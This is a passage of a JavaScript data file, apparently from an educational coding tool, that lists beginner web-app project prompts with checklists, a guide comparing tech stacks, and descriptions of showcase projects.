      followupPrompts: ['Add task names for sessions', 'Save session history', 'Add notification API', 'Add achievements/streaks'],
      reviewChecklist: ['Timer accurate?', 'Pause/resume works?', 'Sound playable?', 'Mobile-friendly?'],
    },
    {
      prompt: 'Build a Quiz App for studying. Allow uploading questions in JSON format, take the quiz with timer, show score + review of answers with explanations.',
      category: 'Education',
      complexity: 'Intermediate',
      whatYouLearn: 'JSON parsing, FileReader API, form handling, timer logic',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add categories', 'Save high scores', 'Add multi-choice + fill-in-blank', 'Add image questions'],
      reviewChecklist: ['Handles bad JSON?', 'Timer works?', 'Score calculation right?', 'Review screen helpful?'],
    },
    {
      prompt: 'Make a Flashcard App with spaced repetition. Show cards based on SM-2 algorithm — cards I got wrong come back sooner.',
      category: 'Education',
      complexity: 'Advanced',
      whatYouLearn: 'SM-2 algorithm, date arithmetic, data persistence',
      expectedSize: '~500-700 lines',
      followupPrompts: ['Add multiple decks', 'Add images/audio', 'Add statistics graph', 'Add daily goal'],
      reviewChecklist: ['SM-2 calculations right?', 'Cards reschedule correctly?', 'Persistence works?'],
    },
    {
      prompt: 'Create a Habit Tracker. Add habits I want to build. Check off each day completed. Show streak counter + monthly heat map.',
      category: 'Productivity',
      complexity: 'Intermediate',
      whatYouLearn: 'Date handling, calendar UI, streak calculation, data visualization',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add habit categories', 'Add goal tracking', 'Add reminders', 'Add export'],
      reviewChecklist: ['Streak accurate?', 'Heat map visible?', 'Future dates not selectable?'],
    },
    {
      prompt: 'Build a Personal Budget Tracker. Add income + expenses, categorize, see spending by category (pie chart), monthly totals.',
      category: 'Finance',
      complexity: 'Intermediate',
      whatYouLearn: 'CRUD operations, date filtering, basic charts',
      expectedSize: '~500-700 lines',
      followupPrompts: ['Add multiple accounts', 'Add recurring transactions', 'Add budget goals', 'Export to CSV'],
      reviewChecklist: ['Math correct?', 'Categories saveable?', 'Charts accessible?'],
    },
    {
      prompt: 'Make a Recipe Finder. Input ingredients, get matching recipes from an API. Save favorites locally.',
      category: 'Lifestyle',
      complexity: 'Intermediate',
      whatYouLearn: 'API integration (fetch), JSON, async/await, localStorage',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add nutrition info', 'Add shopping list', 'Add meal planner', 'Filter by dietary restrictions'],
      reviewChecklist: ['API errors handled?', 'Loading states clear?', 'Accessibility?'],
    },
    {
      prompt: 'Create a Weather Dashboard. Show current weather + 5-day forecast for any city. Use Open-Meteo API (free, no key).',
      category: 'Information',
      complexity: 'Intermediate',
      whatYouLearn: 'Weather APIs, data parsing, UI design',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Add geolocation', 'Save favorite cities', 'Add weather icons', 'Add hourly forecast'],
      reviewChecklist: ['API errors handled?', 'Mobile responsive?', 'Loading states?'],
    },
    {
      prompt: 'Build a Markdown Editor + Previewer. Type Markdown on left, see rendered HTML on right. Save documents locally.',
      category: 'Tools',
      complexity: 'Intermediate',
      whatYouLearn: 'Markdown parsing, real-time updates, contenteditable or textarea',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Add export to PDF', 'Add multiple documents', 'Add search', 'Add image upload'],
      reviewChecklist: ['Renders correctly?', 'Saves correctly?', 'Keyboard shortcuts?'],
    },
    {
      prompt: 'Make a Color Palette Generator. Generate harmonious color schemes. Save palettes. Export as CSS variables.',
      category: 'Design',
      complexity: 'Intermediate',
      whatYouLearn: 'Color theory, RGB/HSL, copy to clipboard',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Add accessibility contrast check', 'Add color blind preview', 'Add image picker', 'Add Tailwind config export'],
      reviewChecklist: ['Colors actually harmonious?', 'Export works?', 'Save persists?'],
    },
    {
      prompt: 'Create a Drawing App with brush, eraser, color picker, sizes, undo, and save as PNG.',
      category: 'Creative',
      complexity: 'Intermediate',
      whatYouLearn: 'Canvas API, mouse events, image export',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add shapes (rectangle, circle)', 'Add text tool', 'Add fill bucket', 'Add layers'],
      reviewChecklist: ['Mouse + touch work?', 'Undo works?', 'Save downloads correctly?'],
    },
    {
      prompt: 'Build a Tic-Tac-Toe Game with AI opponent (minimax algorithm). Two-player mode option. Show win lines.',
      category: 'Games',
      complexity: 'Intermediate',
      whatYouLearn: 'Game logic, minimax algorithm, animations',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add difficulty levels', '4x4 board', 'Tournament mode', 'Online multiplayer'],
      reviewChecklist: ['Win detection correct?', 'AI unbeatable on hard?', 'Reset works?'],
    },
    {
      prompt: 'Make a Snake Game using Canvas. Use arrow keys. Eat food to grow. Don\'t hit walls or yourself. Show score.',
      category: 'Games',
      complexity: 'Intermediate',
      whatYouLearn: 'Canvas, game loop, collision detection, keyboard input',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Add difficulty', 'Add high score', 'Add power-ups', 'Add multiplayer'],
      reviewChecklist: ['Collisions accurate?', 'Pause works?', 'Mobile controls?'],
    },
    {
      prompt: 'Create a Memory Card Matching Game with 16 cards. Theme: emoji of your choice. Track moves + time. Multiple difficulty levels.',
      category: 'Games',
      complexity: 'Beginner',
      whatYouLearn: 'Array shuffling, state machine, 3D CSS transforms',
      expectedSize: '~300-400 lines',
      followupPrompts: ['Add themes', 'Add timer', 'Save best scores', 'Multiplayer mode'],
      reviewChecklist: ['Shuffle truly random?', 'Match detection right?', 'Animation smooth?'],
    },
    {
      prompt: 'Build a Calculator with basic operations + scientific functions (sqrt, sin, cos, log). History of calculations.',
      category: 'Tools',
      complexity: 'Intermediate',
      whatYouLearn: 'State machine, math functions, history tracking',
      expectedSize: '~400-500 lines',
      followupPrompts: ['Add memory functions', 'Keyboard input', 'Expression parsing (PEMDAS)', 'Unit converter mode'],
      reviewChecklist: ['Math correct?', 'Order of operations right?', 'Division by zero handled?'],
    },
    {
      prompt: 'Make a Personal Website with multiple pages: Home, About, Projects, Contact. Modern responsive design. Smooth scroll. Contact form (no backend, just demo).',
      category: 'Web design',
      complexity: 'Beginner',
      whatYouLearn: 'Multi-page navigation, responsive design, modern CSS, forms',
      expectedSize: '~500-700 lines',
      followupPrompts: ['Add dark mode', 'Add blog', 'Add animations', 'Add 3D elements'],
      reviewChecklist: ['Mobile responsive?', 'Accessibility good?', 'Loads fast?'],
    },
    {
      prompt: 'Build a Resume Builder. Form to enter your info. Live preview of resume. Multiple themes. Export as PDF (using browser print).',
      category: 'Professional',
      complexity: 'Intermediate',
      whatYouLearn: 'Forms, real-time preview, CSS for print, PDF export',
      expectedSize: '~500-700 lines',
      followupPrompts: ['Add more themes', 'Save resume drafts', 'Multi-page resumes', 'Customize sections'],
      reviewChecklist: ['Print looks good?', 'Themes consistent?', 'Forms validate?'],
    },
    {
      prompt: 'Create a Mood Tracker. Log daily mood + reason. Show 30-day chart. Color-coded by mood category. Optional notes.',
      category: 'Health',
      complexity: 'Beginner',
      whatYouLearn: 'Date handling, simple charts, sensitive data UX',
      expectedSize: '~300-400 lines',
      followupPrompts: ['Add prompts for journaling', 'Mood patterns analysis', 'Encrypted local storage', 'Crisis support links'],
      reviewChecklist: ['Privacy considerations?', 'Insensitive content avoided?', 'Crisis info available?'],
    },
    {
      prompt: 'Build a Workout Tracker. Log exercises (name, sets, reps, weight). Show progress over time. Personal records highlighted.',
      category: 'Health',
      complexity: 'Intermediate',
      whatYouLearn: 'Complex data models, charts, progress visualization',
      expectedSize: '~500-700 lines',
      followupPrompts: ['Add workout templates', 'Add rest timer', 'Generate workout plans', 'Track measurements'],
      reviewChecklist: ['Math correct?', 'Date filtering works?', 'PR detection?'],
    },
    {
      prompt: 'Make a Photo Gallery with upload, tag, search, slideshow. All local (no cloud).',
      category: 'Media',
      complexity: 'Intermediate',
      whatYouLearn: 'File upload, image handling, search, slideshow',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add image editing (crop, rotate)', 'Add EXIF reading', 'Add face detection', 'Cloud sync'],
      reviewChecklist: ['Large images handled?', 'Storage limits checked?', 'Slideshow accessible?'],
    },
    {
      prompt: 'Create a Music Player. Upload local music files. Build playlist. Show track info. Standard playback controls.',
      category: 'Media',
      complexity: 'Intermediate',
      whatYouLearn: 'Audio API, file handling, playlist management',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add visualizer', 'Add equalizer', 'Read metadata (artist, album)', 'Save playlists'],
      reviewChecklist: ['Playback works?', 'Track changes smoothly?', 'Volume control accessible?'],
    },
    {
      prompt: 'Build a Local Chat Simulator. Two-pane (me + AI). I type, AI responds (faked with random delays). Show typing indicator.',
      category: 'Tools',
      complexity: 'Beginner',
      whatYouLearn: 'Form handling, async simulation, scroll management',
      expectedSize: '~250-400 lines',
      followupPrompts: ['Real AI integration', 'Multiple chat rooms', 'File sharing', 'Voice mode'],
      reviewChecklist: ['Scrolling auto?', 'Messages clear?', 'Aria-live for new messages?'],
    },
    {
      prompt: 'Make a Sticky Notes Board. Create notes, drag to position, edit in place, change colors, delete.',
      category: 'Productivity',
      complexity: 'Intermediate',
      whatYouLearn: 'Drag-and-drop, inline editing, color picker',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Save board state', 'Multi-board', 'Search across notes', 'Share boards'],
      reviewChecklist: ['Drag works on touch?', 'Note text editable?', 'Saves position?'],
    },
    {
      prompt: 'Create a Currency Converter using a free exchange rate API. Common currencies. Auto-detect base.',
      category: 'Tools',
      complexity: 'Beginner',
      whatYouLearn: 'API integration, math formatting, error handling',
      expectedSize: '~200-300 lines',
      followupPrompts: ['Add more currencies', 'Add crypto', 'Historical chart', 'Save favorites'],
      reviewChecklist: ['Rates correct?', 'Loading states?', 'Math precise (decimals)?'],
    },
    {
      prompt: 'Build a Code Editor for a single language (HTML/CSS/JS). Syntax highlighting. Run code in sandbox.',
      category: 'Developer tools',
      complexity: 'Advanced',
      whatYouLearn: 'Language parsing, iframe sandbox, real-time execution',
      expectedSize: '~700-1000 lines',
      followupPrompts: ['Support more languages', 'Save snippets', 'Format on save', 'Linting'],
      reviewChecklist: ['Sandbox secure?', 'Performance OK?', 'Keyboard friendly?'],
    },
    {
      prompt: 'Make a Pixel Art Maker. Configurable grid size. Click cells to color. Save as PNG. Multiple colors.',
      category: 'Creative',
      complexity: 'Intermediate',
      whatYouLearn: 'Grid layout, click handlers, image export',
      expectedSize: '~300-400 lines',
      followupPrompts: ['Animation frames', 'Layers', 'Export multiple formats', 'Built-in palettes'],
      reviewChecklist: ['Grid resizes?', 'Save works?', 'Mobile-friendly?'],
    },
    {
      prompt: 'Create a Local Wiki — internal knowledge base. Pages with markdown. Internal links between pages. Search.',
      category: 'Knowledge',
      complexity: 'Advanced',
      whatYouLearn: 'Markdown parsing, hyperlinking, full-text search',
      expectedSize: '~500-700 lines',
      followupPrompts: ['Tag system', 'Versioning', 'Export wiki', 'Cloud sync'],
      reviewChecklist: ['Links work?', 'Search fast?', 'Markdown safe (no XSS)?'],
    },
    {
      prompt: 'Build a Periodic Table reference. Click element to see details. Search by name/symbol. Filter by category.',
      category: 'Education',
      complexity: 'Intermediate',
      whatYouLearn: 'Data display, filtering, hover/click states',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Add electron configuration', '3D model', 'Quiz mode', 'Compare elements'],
      reviewChecklist: ['Accurate data?', 'Search responsive?', 'Mobile readable?'],
    },
    {
      prompt: 'Make a Plant Care Reminder. Add plants, water schedules, last watered. Visual reminders + history.',
      category: 'Lifestyle',
      complexity: 'Intermediate',
      whatYouLearn: 'Date calculations, scheduling, reminder UI',
      expectedSize: '~400-500 lines',
      followupPrompts: ['Push notifications', 'Plant photos', 'Care tips per plant type', 'Sharing/community'],
      reviewChecklist: ['Reminders accurate?', 'Plants editable?', 'History helpful?'],
    },
    {
      prompt: 'Create an Astronomy Picture of the Day viewer. Use NASA APOD API. Show photo, description, share button.',
      category: 'Information',
      complexity: 'Beginner',
      whatYouLearn: 'API integration, image display, share API',
      expectedSize: '~250-350 lines',
      followupPrompts: ['Date picker for past APODs', 'Save favorites', 'Share to social', 'Full-screen mode'],
      reviewChecklist: ['Loads correctly?', 'Image alt text?', 'API errors handled?'],
    },
    {
      prompt: 'Build a Pronunciation Practice tool. Pick word, hear pronunciation (text-to-speech). Record self, compare.',
      category: 'Education',
      complexity: 'Intermediate',
      whatYouLearn: 'Speech synthesis, MediaRecorder API, audio playback',
      expectedSize: '~400-600 lines',
      followupPrompts: ['Difficulty levels', 'Track progress', 'Add languages', 'Save recordings'],
      reviewChecklist: ['Speech clear?', 'Recording works?', 'Privacy considered?'],
    },
    {
      prompt: 'Make a Local Server Status checker. Test if a URL is up, response time. Test multiple URLs.',
      category: 'Tools',
      complexity: 'Intermediate',
      whatYouLearn: 'fetch with timing, error handling, parallel requests',
      expectedSize: '~300-400 lines',
      followupPrompts: ['Save URLs to monitor', 'Notification on down', 'Latency graph', 'Test API endpoints'],
      reviewChecklist: ['CORS handled?', 'Timeouts work?', 'Errors clear?'],
    },
    {
      prompt: 'Create a Word Counter for writing. Real-time word + char count. Reading time estimate. Track sessions.',
      category: 'Writing',
      complexity: 'Beginner',
      whatYouLearn: 'Real-time updates, text analysis, time formatting',
      expectedSize: '~200-300 lines',
      followupPrompts: ['Add reading level (Flesch)', 'Multiple docs', 'Goal setting (NaNoWriMo style)', 'Export'],
      reviewChecklist: ['Count accurate?', 'Reading time reasonable?', 'Mobile-friendly?'],
    },
    {
      prompt: 'Build a Color Picker that lets users select from image. Click on photo, get exact color. Build palette.',
      category: 'Design',
      complexity: 'Intermediate',
      whatYouLearn: 'Canvas image, getImageData, color manipulation',
      expectedSize: '~300-400 lines',
      followupPrompts: ['Save palettes', 'Average colors in region', 'Image filters', 'Hex/RGB/HSL conversion'],
      reviewChecklist: ['Colors accurate?', 'Image upload works?', 'Click precision?'],
    },
    {
      prompt: 'Make a Multi-Language Translator. Input text, select source + target language. Use a free translation API.',
      category: 'Tools',
      complexity: 'Intermediate',
      whatYouLearn: 'API integration, language data, async UI',
      expectedSize: '~300-500 lines',
      followupPrompts: ['Save translation history', 'Detect language automatically', 'Voice input/output', 'Compare translations'],
      reviewChecklist: ['Languages comprehensive?', 'Error handling?', 'API rate limits?'],
    },
  ];

  // ─── Tech stack guide (which tools for which job) ────────────────
  var TECH_STACKS = [
    {
      stack: 'Static Personal Site',
      purpose: 'Portfolio, blog, marketing site',
      stack_components: 'HTML + CSS + minimal JS, hosted on GitHub Pages or Netlify.',
      whyChoose: 'Simple, free, fast, no maintenance.',
      timeToShip: '1-2 days',
      cost: 'Free',
      maintainability: 'Very high (almost zero maintenance)',
      performance: 'Excellent',
      example: 'Your personal portfolio',
      proAndCon: 'Pro: free + simple. Con: limited dynamism.',
    },
    {
      stack: 'Static Site + Headless CMS',
      purpose: 'Content site with non-dev contributors',
      stack_components: 'Astro/11ty/Next.js + Contentful/Sanity/Strapi + Netlify/Vercel.',
      whyChoose: 'Performance + flexible content management.',
      timeToShip: '1-2 weeks',
      cost: '$0-$50/month',
      maintainability: 'High',
      performance: 'Excellent',
      example: 'Marketing site, documentation, blogs',
      proAndCon: 'Pro: editors love it. Con: build times grow with content.',
    },
    {
      stack: 'JAMstack with API',
      purpose: 'Modern web app',
      stack_components: 'Next.js + Supabase/Firebase + Vercel.',
      whyChoose: 'Modern, scalable, good DX.',
      timeToShip: '2-4 weeks for MVP',
      cost: '$0-$100/month at small scale',
      maintainability: 'High',
      performance: 'Excellent',
      example: 'SaaS app, dashboard, marketplace',
      proAndCon: 'Pro: scales smoothly. Con: vendor lock-in possible.',
    },
    {
      stack: 'Full-stack JavaScript (MERN)',
      purpose: 'Traditional web app',
      stack_components: 'MongoDB + Express + React + Node.js.',
      whyChoose: 'JavaScript everywhere, large community.',
      timeToShip: '2-4 weeks for MVP',
      cost: '$10-$50/month at small scale',
      maintainability: 'Medium-high',
      performance: 'Good',
      example: 'Social network, marketplace, internal tools',
      proAndCon: 'Pro: well-trodden path. Con: need to manage servers.',
    },
    {
      stack: 'Full-stack Python (Django + DRF)',
      purpose: 'Traditional web app',
      stack_components: 'Django + Django REST Framework + PostgreSQL + Heroku/Railway.',
      whyChoose: 'Batteries-included framework. Strong admin interface.',
      timeToShip: '2-4 weeks',
      cost: '$10-$50/month',
      maintainability: 'High',
      performance: 'Good',
      example: 'Internal admin tools, traditional web apps',
      proAndCon: 'Pro: opinionated, fast to scaffold. Con: less SPA-friendly.',
    },
    {
      stack: 'Full-stack Ruby on Rails',
      purpose: 'Web app',
      stack_components: 'Rails + PostgreSQL + Heroku/Render.',
      whyChoose: 'Convention over configuration. Fast prototyping.',
      timeToShip: '2-4 weeks',
      cost: '$10-$50/month',
      maintainability: 'High',
      performance: 'Good',
      example: 'GitHub, Shopify, Twitter (originally), Airbnb',
      proAndCon: 'Pro: opinionated + fast. Con: smaller community now than JS.',
    },
    {
      stack: 'Mobile-first React Native',
      purpose: 'Cross-platform mobile app',
      stack_components: 'React Native + Expo + Firebase.',
      whyChoose: 'Single codebase for iOS + Android.',
      timeToShip: '4-8 weeks for MVP',
      cost: '$50-$200/month + $99/year iOS + $25 once Android',
      maintainability: 'Medium',
      performance: 'Good (some native compromises)',
      example: 'Most consumer mobile apps',
      proAndCon: 'Pro: cross-platform. Con: some platform-specific code still needed.',
    },
    {
      stack: 'Mobile-first Flutter',
      purpose: 'Cross-platform mobile app',
      stack_components: 'Flutter + Dart + Firebase.',
      whyChoose: 'Single codebase, native-like performance.',
      timeToShip: '4-8 weeks for MVP',
      cost: 'Similar to RN',
      maintainability: 'Medium',
      performance: 'Excellent (closer to native than RN)',
      example: 'Google\'s preferred cross-platform option',
      proAndCon: 'Pro: performance. Con: smaller community than RN.',
    },
    {
      stack: 'Native iOS',
      purpose: 'iOS-specific app',
      stack_components: 'Swift + SwiftUI + Xcode (Mac required).',
      whyChoose: 'Best iOS experience + performance.',
      timeToShip: '4-8 weeks',
      cost: '$99/year Apple Developer + Mac',
      maintainability: 'Medium',
      performance: 'Best on iOS',
      example: 'Premium iOS apps, games',
      proAndCon: 'Pro: native excellence. Con: separate Android needed.',
    },
    {
      stack: 'Native Android',
      purpose: 'Android-specific app',
      stack_components: 'Kotlin + Jetpack Compose + Android Studio.',
      whyChoose: 'Best Android experience.',
      timeToShip: '4-8 weeks',
      cost: '$25 once Android Developer',
      maintainability: 'Medium',
      performance: 'Best on Android',
      example: 'Android-first apps',
      proAndCon: 'Pro: native excellence. Con: separate iOS needed.',
    },
    {
      stack: 'Real-time chat',
      purpose: 'Chat/messaging app',
      stack_components: 'WebSockets + Node.js + Redis + frontend framework.',
      whyChoose: 'Real-time bi-directional communication.',
      timeToShip: '4-8 weeks',
      cost: '$20-$100/month',
      maintainability: 'Medium',
      performance: 'Good',
      example: 'Slack, Discord clones, customer support chat',
      proAndCon: 'Pro: real-time. Con: harder to scale than HTTP.',
    },
    {
      stack: 'E-commerce',
      purpose: 'Online store',
      stack_components: 'Shopify, WooCommerce, or custom Next.js + Stripe + PostgreSQL.',
      whyChoose: 'Sell products online.',
      timeToShip: '1-12 weeks depending on platform',
      cost: '$30-$300/month + transaction fees',
      maintainability: 'High (Shopify) to Medium (custom)',
      performance: 'Good',
      example: 'Shopify stores, custom commerce sites',
      proAndCon: 'Pro: turnkey. Con: per-platform limits.',
    },
    {
      stack: 'Real-time multiplayer game',
      purpose: 'Browser game with multiple players',
      stack_components: 'Canvas/WebGL + WebSockets + Node.js + Redis.',
      whyChoose: 'Browser-based multiplayer.',
      timeToShip: '8-16 weeks',
      cost: '$50-$500/month',
      maintainability: 'Low-medium',
      performance: 'Browser-limited',
      example: 'Web-based io games',
      proAndCon: 'Pro: no install. Con: browser performance ceiling.',
    },
    {
      stack: 'Data dashboard',
      purpose: 'Visualize + analyze data',
      stack_components: 'React + D3/Chart.js + backend API.',
      whyChoose: 'Visualize complex data.',
      timeToShip: '2-6 weeks',
      cost: '$0-$200/month',
      maintainability: 'Medium-high',
      performance: 'Depends on data size',
      example: 'Internal analytics dashboards',
      proAndCon: 'Pro: visual insight. Con: requires good data layer.',
    },
    {
      stack: 'AI-powered app',
      purpose: 'App with AI features',
      stack_components: 'Frontend + Backend + AI API (OpenAI, Anthropic, Google).',
      whyChoose: 'Leverage AI without training models.',
      timeToShip: '2-6 weeks',
      cost: 'AI API costs vary widely',
      maintainability: 'Medium',
      performance: 'Limited by AI latency',
      example: 'AI assistant, content generation, classification',
      proAndCon: 'Pro: quick AI integration. Con: ongoing API costs.',
    },
    {
      stack: 'PWA (offline-capable)',
      purpose: 'App that works offline + installs',
      stack_components: 'Modern web stack + Service Worker + Manifest.',
      whyChoose: 'Cross-platform without app stores.',
      timeToShip: '2-4 weeks for offline-ready',
      cost: 'Same as web app',
      maintainability: 'Medium',
      performance: 'Good',
      example: 'Twitter Lite, Spotify\'s web app',
      proAndCon: 'Pro: cross-platform + offline. Con: limited compared to native.',
    },
    {
      stack: 'Microservices (large scale)',
      purpose: 'Large enterprise app',
      stack_components: 'Multiple services + Kubernetes + API gateway + databases.',
      whyChoose: 'Independent scaling, multiple teams.',
      timeToShip: '6-18 months',
      cost: '$1000-$10000+/month',
      maintainability: 'Complex',
      performance: 'Can scale infinitely',
      example: 'Netflix, Amazon, Spotify',
      proAndCon: 'Pro: infinite scale. Con: massive complexity.',
    },
    {
      stack: 'Serverless (functions only)',
      purpose: 'Variable-load apps',
      stack_components: 'AWS Lambda + API Gateway + DynamoDB + S3.',
      whyChoose: 'Pay only for usage. No server admin.',
      timeToShip: '2-4 weeks',
      cost: 'Variable — could be very low',
      maintainability: 'High',
      performance: 'Cold start latency',
      example: 'Webhooks, scheduled jobs, low-traffic APIs',
      proAndCon: 'Pro: scales auto + cheap when idle. Con: cold starts.',
    },
    {
      stack: 'Edge functions',
      purpose: 'Globally-distributed compute',
      stack_components: 'Cloudflare Workers, Vercel Edge, Deno Deploy.',
      whyChoose: 'Fast worldwide. Cheap.',
      timeToShip: '1-4 weeks',
      cost: 'Very low at small scale',
      maintainability: 'High',
      performance: 'Excellent latency',
      example: 'Personalization, A/B testing, image transformation',
      proAndCon: 'Pro: globally fast. Con: limited compute per request.',
    },
    {
      stack: 'Static + Edge + Headless',
      purpose: 'Modern marketing/content site',
      stack_components: 'Astro/Next + Cloudflare Pages + headless CMS.',
      whyChoose: 'Modern best practices. Cheap + fast.',
      timeToShip: '1-4 weeks',
      cost: '$0-$50/month',
      maintainability: 'High',
      performance: 'Excellent',
      example: 'Modern startup sites',
      proAndCon: 'Pro: state-of-the-art. Con: stack complexity.',
    },
  ];

  // ─── Project showcase: detailed examples of well-built apps ──────
  var SHOWCASE_PROJECTS = [
    {
      name: 'NotesApp Pro',
      category: 'Productivity',
      complexity: 'Intermediate (3/5)',
      timeToBuild: '6-10 hours',
      buildingBlocks: ['HTML form', 'localStorage', 'rich text editor', 'search', 'tag system'],
      features: [
        'Create + edit notes (with rich text)',
        'Organize with tags + folders',
        'Search across all notes (with highlights)',
        'Export to plain text or Markdown',
        'Dark mode',
        'Keyboard shortcuts (Ctrl+N for new, Ctrl+S to save)',
        'Last-modified sorting',
        'Trash/recycle bin with restore',
      ],
      learningGoals: [
        'CRUD operations',
        'Search algorithms',
        'Rich text editing (or contenteditable)',
        'Keyboard event handling',
        'Persistent storage',
      ],
      challenges: [
        'Implementing search across many notes (consider indexing)',
        'Rich text editing (contenteditable has quirks)',
        'Sync conflicts if you add cloud sync',
      ],
      a11yChecklist: [
        'Keyboard navigation throughout',
        'Screen reader announcements for saved/deleted',
        'Color contrast in dark mode',
        'Large text option',
        'High-contrast theme option',
      ],
      extensions: [
        'Cloud sync (Firebase)',
        'Multi-user collaboration',
        'Voice notes (audio recording)',
        'OCR for photo notes',
        'Reminders + notifications',
      ],
    },
    {
      name: 'FitTrack',
      category: 'Health',
      complexity: 'Advanced (4/5)',
      timeToBuild: '12-20 hours',
      buildingBlocks: ['Forms', 'data visualization', 'date handling', 'charts'],
      features: [
        'Log workouts (exercise, sets, reps, weight)',
        'Track measurements (weight, body fat, etc.)',
        'Visualize progress (charts)',
        'Set goals + track progress',
        'Workout templates',
        'Personal records (PRs)',
        'Calendar view',
        'Export data to CSV',
      ],
      learningGoals: [
        'Complex data modeling',
        'Date handling',
        'Data visualization (Canvas + SVG)',
        'Form design',
        'Calendar UI',
      ],
      challenges: [
        'Chart rendering (use SVG or library)',
        'Handling many data points',
        'Calendar layout responsive',
      ],
      a11yChecklist: [
        'Charts have text alternatives',
        'Forms have proper labels',
        'Color is not only indicator',
        'Voice input option for measurements',
      ],
      extensions: [
        'Wearable integration',
        'Social features (compare with friends)',
        'AI workout suggestions',
        'Macro tracking',
        'Photo progress comparison',
      ],
    },
    {
      name: 'StudyBuddy',
      category: 'Education',
      complexity: 'Intermediate (3/5)',
      timeToBuild: '8-12 hours',
      buildingBlocks: ['Flashcards', 'spaced repetition', 'progress tracking', 'multimedia'],
      features: [
        'Create + manage flashcard decks',
        'Spaced repetition (SM-2 algorithm)',
        'Multiple choice + fill-in-blank + flashcard formats',
        'Image + audio support',
        'Progress statistics (mastery, retention)',
        'Daily study session',
        'Shared decks (export/import)',
        'Categories + tags',
      ],
      learningGoals: [
        'SM-2 spaced repetition algorithm',
        'Date arithmetic',
        'Audio + image handling',
        'Statistics visualization',
        'Algorithm design',
      ],
      challenges: [
        'Implementing SM-2 correctly',
        'Audio recording in browser',
        'Statistics presentation',
      ],
      a11yChecklist: [
        'Multiple input modalities (typing, clicking, speaking)',
        'Audio alternatives to text where useful',
        'Adjustable timing for study sessions',
      ],
      extensions: [
        'AI-generated flashcards from notes',
        'Collaborative decks with classmates',
        'Adaptive difficulty',
        'Achievements + gamification',
      ],
    },
    {
      name: 'PortfolioBuilder',
      category: 'Professional',
      complexity: 'Intermediate (3/5)',
      timeToBuild: '8-12 hours',
      buildingBlocks: ['Page builder', 'image management', 'templates', 'export'],
      features: [
        'Drag-and-drop page builder',
        'Choose from templates',
        'Add sections (about, projects, contact)',
        'Image upload + management',
        'Custom domain (with hosting)',
        'Mobile-responsive automatically',
        'SEO meta tags',
        'Export as static HTML',
      ],
      learningGoals: [
        'Drag-and-drop UX',
        'Template system',
        'Image processing',
        'Static site generation',
      ],
      challenges: [
        'Drag-and-drop is complex',
        'Maintaining responsiveness',
        'Image optimization',
      ],
      a11yChecklist: [
        'Drag-and-drop has keyboard alternative',
        'Final site is accessible',
        'Built-in alt text reminders',
      ],
      extensions: [
        'AI design suggestions',
        'Analytics integration',
        'Contact form (with backend)',
        'Custom domain auto-setup',
        'Multi-language support',
      ],
    },
    {
      name: 'MindfulMe',
      category: 'Mental health',
      complexity: 'Intermediate (3/5)',
      timeToBuild: '8-12 hours',
      buildingBlocks: ['Mood tracking', 'meditation timer', 'journaling', 'mental health resources'],
      features: [
        'Daily mood check-in',
        'Mood patterns over time',
        'Journal entries (private, encrypted)',
        'Guided meditations + breathing exercises',
        'Sleep tracking',
        'Mental health resources (NEDA, AFSP hotlines)',
        'Crisis support (one-tap to crisis hotline)',
        'Goal setting + tracking',
      ],
      learningGoals: [
        'Sensitive data handling',
        'Privacy + encryption',
        'Mental health UX',
        'Resource curation',
      ],
      challenges: [
        'Privacy + security paramount',
        'Mental health UX must be careful',
        'Crisis safety planning',
      ],
      a11yChecklist: [
        'Multiple input methods (voice, draw, text)',
        'Calming color schemes',
        'No flashing or jarring transitions',
        'Crisis information always visible',
      ],
      extensions: [
        'Telehealth integration',
        'Support group connection',
        'AI-assisted reflection',
        'Family sharing (with consent)',
      ],
    },
    {
      name: 'CommunityHelper',
      category: 'Social impact',
      complexity: 'Advanced (4/5)',
      timeToBuild: '15-25 hours',
      buildingBlocks: ['Location services', 'maps', 'user accounts', 'matching algorithm'],
      features: [
        'Find local community services',
        'Volunteer opportunities matching',
        'Need-help vs offer-help posts',
        'Safety verification',
        'Rating + reviews',
        'Real-time messaging',
        'Multi-language',
        'Free service for community',
      ],
      learningGoals: [
        'Geolocation + maps',
        'User authentication',
        'Matching algorithms',
        'Real-time features',
        'Internationalization',
      ],
      challenges: [
        'Trust + safety',
        'Privacy protections',
        'Multi-language UI',
        'Service availability',
      ],
      a11yChecklist: [
        'WCAG 2.1 AAA where possible',
        'Multi-language including LTR + RTL',
        'Voice input + output',
        'High-contrast mode',
      ],
      extensions: [
        'Government partnership',
        'NGO integration',
        'Crisis response coordination',
        'Skills marketplace',
      ],
    },
    {
      name: 'OpenSchedule',
      category: 'Education',
      complexity: 'Advanced (4/5)',
      timeToBuild: '15-25 hours',
      buildingBlocks: ['Calendar', 'multi-user accounts', 'permissions', 'notifications'],
      features: [
        'Class schedule management',
        'Multi-school district support',
        'Teacher + student + parent views',
        'Assignment tracking',
        'Grade reporting',
        'Parent-teacher conference scheduling',
        'School event calendar',
        'Notifications (email + push)',
      ],
      learningGoals: [
        'Multi-user systems',
        'Role-based access control',
        'Calendar logic',
        'Notification systems',
      ],
      challenges: [
        'Permissions complexity',
        'Different views for different roles',
        'Time zone handling',
        'Conflict resolution (overlapping events)',
      ],
      a11yChecklist: [
        'Calendar accessible to screen readers',
        'Multiple input methods',
        'Notifications respectful of user preferences',
      ],
      extensions: [
        'LMS integration (Canvas, Google Classroom)',
        'School-specific theming',
        'Bus route integration',
        'Cafeteria menu integration',
      ],
    },
    {
      name: 'AudibleNotes',
      category: 'Accessibility',
      complexity: 'Advanced (4/5)',
      timeToBuild: '12-20 hours',
      buildingBlocks: ['Speech-to-text', 'audio recording', 'text-to-speech', 'transcription'],
      features: [
        'Voice notes with auto-transcription',
        'Adjustable playback speed',
        'Search transcript while listening',
        'Highlight + bookmark moments',
        'Export to text or share as audio',
        'Background noise reduction',
        'Speaker identification',
        'Foreign language support',
      ],
      learningGoals: [
        'Web Speech API',
